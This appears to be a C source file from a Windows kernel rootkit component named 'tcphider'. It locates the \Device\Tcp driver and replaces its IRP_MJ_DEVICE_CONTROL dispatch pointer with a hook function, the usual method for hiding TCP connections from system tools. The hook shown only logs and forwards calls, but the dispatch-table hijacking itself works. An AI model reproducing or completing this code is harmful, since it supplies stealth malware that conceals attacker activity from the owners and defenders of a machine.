#include "hide/tcp/tcphider.h"

#include "dbgutils.h"


IRP_MJ_Device_Control_t old_irp_mj_device_control;

PFILE_OBJECT g_file_object;
PDEVICE_OBJECT g_device_object;;
PDRIVER_OBJECT g_driver_object;

int
tcphider_init()
{
    WCHAR device_tcp_name_buffer[] = L"\\Device\\Tcp";
    UNICODE_STRING device_tcp_unicode_string;

    RtlInitUnicodeString(&device_tcp_unicode_string,
                     device_tcp_name_buffer);

    g_file_object = NULL;
    g_device_object = NULL;
    g_driver_object = NULL;

    NTSTATUS status = IoGetDeviceObjectPointer(
                          &device_tcp_unicode_string,
                          FILE_READ_DATA,
                          &g_file_object,
                          &g_device_object);

    if ( !NT_SUCCESS(status) )
        return ( 0 );

    g_driver_object = g_device_object->DriverObject;

    old_irp_mj_device_control = (IRP_MJ_Device_Control_t)g_driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL];

    if ( NULL == old_irp_mj_device_control )
        return ( 0 );

    PVOID old_ptr = InterlockedExchangePointer(
                        &(g_driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL]),
                        tcp_hook_function);

    return ( 1 );
}


NTSTATUS tcp_hook_function(
    IN PDEVICE_OBJECT device_object,
    IN PIRP irp)
{
    DEBUG_PRINT("hook called\n");

    return old_irp_mj_device_control(device_object,
                              irp);


//    return ( STATUS_ABANDONED );
}
